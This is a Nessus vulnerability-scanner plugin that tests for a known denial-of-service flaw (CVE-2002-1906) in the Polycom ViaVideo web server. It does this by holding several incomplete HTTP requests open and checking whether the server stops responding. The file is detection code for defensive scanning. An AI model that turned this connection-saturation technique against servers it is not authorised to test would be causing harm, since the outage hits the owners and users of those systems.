#
# (C) Tenable Network Security, Inc.
#

########################
# References:
########################
# 
# Date:	 Mon, 14 Oct 2002 08:27:54 +1300 (NZDT)
# From:	advisory@prophecy.net.nz
# To:	bugtraq@securityfocus.com
# Subject: Security vulnerabilities in Polycom ViaVideo Web component
#
########################

include("compat.inc");

if(description)
{
 script_id(11825);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2002-1906");
 script_bugtraq_id(5962);
 script_osvdb_id(51572);
 
 script_name(english:"Polycom ViaVideo Web Server Incomplete HTTP Connection Saturation Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a remote denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote web server locks up when several incomplete web 
requests are sent and the connections are kept open.

Some servers (e.g. Polycom ViaVideo) even run an endless loop, 
using much CPU on the machine. Nessus has no way to test this, 
but you'd better check your machine." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2002/Oct/195" );
 script_set_attribute(attribute:"see_also", value:"http://www.polycom.com/common/pw_item_show_doc/0,1449,1442,00.pdf" );
 script_set_attribute(attribute:"solution", value:
"Contact your vendor for a patch." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/09/01");
 script_cvs_date("$Date: 2016/10/27 15:03:53 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Several incomplete HTTP requests lock the server");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie('http_version.nasl', 'httpver.nasl', 'www_multiple_get.nasl');
 script_require_ports("Services/www",80);
 exit(0);
}

#

# Keep the old API for this kind of flaw
include('global_settings.inc');
include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);


banner = get_http_banner(port:port);
if ( ! banner || "Viavideo" >!< banner ) exit(0);
if(http_is_dead(port:port))exit(0);

# 4 is enough for Polycom ViaVideo

# Try to avoid FP on CISCO 7940 phone
max = get_kb_item('www/multiple_get/'+port);
if (max)
{
 imax = max * 2 / 3;
 if (imax < 1)
  imax = 1;
 else if (imax > 5)
  imax = 5;
}
else
 imax = 5;

n = 0;
for (i = 0; i < imax; i++)
{
  soc[i] = http_open_socket(port);
  if(soc[i])
  {
    n ++;
    req = http_get(item:"/", port:port);
    req -= '\r\n';
    send(socket:soc[i], data:req);
  }
}

debug_print(n, ' connections on ', imax, ' were opened\n');

dead = 0;
if(http_is_dead(port: port, retry:1)) dead ++;

for (i = 0; i < imax; i++)
  if (soc[i])
    http_close_socket(soc[i]);

if(http_is_dead(port: port, retry:1)) dead ++;

if (dead == 2)
  security_warning(port);
else if (dead == 1)
{
  report=string(
    "\n",
    "The remote web server locks up when several incomplete web\n",
    "requests are sent and the connections are kept open.\n",
    "\n",
    "However, it runs again when the connections are closed.\n",
    "\n"
  );
  security_warning(port: port, extra: report);
}
